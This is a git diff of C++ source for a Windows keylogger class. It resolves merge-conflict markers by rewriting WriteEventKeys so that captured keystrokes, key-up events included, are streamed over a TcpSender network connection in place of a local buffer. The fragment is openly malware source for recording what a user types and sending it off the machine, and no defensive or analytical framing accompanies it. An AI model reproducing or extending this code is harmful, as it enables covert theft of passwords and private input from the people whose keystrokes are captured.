@@ -13,11 +13,7 @@ KeyLogger::KeyLogger() : _keysState(256, false), _keysIgnored(256, false){
     _keysIgnored[VK_MENU] = true;
 }
 
-<<<<<<< Updated upstream
-void KeyLogger::WriteEventKeys(ostream& buf)
-=======
 void KeyLogger::WriteEventKeys(TcpSender* sender)
->>>>>>> Stashed changes
 {	
     bool isEn = (LOWORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0))) == 0x409);
     for (int key = 0; key < 255; key++) {
@@ -38,12 +34,7 @@ void KeyLogger::WriteEventKeys(TcpSender* sender)
                     continue;
                 }
 
-<<<<<<< Updated upstream
-                buf << stringKey << " ";
-
-=======
                 *sender << stringKey + "";
->>>>>>> Stashed changes
 			}
 		}
 		else {
@@ -57,11 +48,7 @@ void KeyLogger::WriteEventKeys(TcpSender* sender)
                     continue;
                 }
 
-<<<<<<< Updated upstream
-                buf << stringKey << "[UP] ";
-=======
                 *sender << stringKey + "[UP]";
->>>>>>> Stashed changes
             }
 		}
 	}
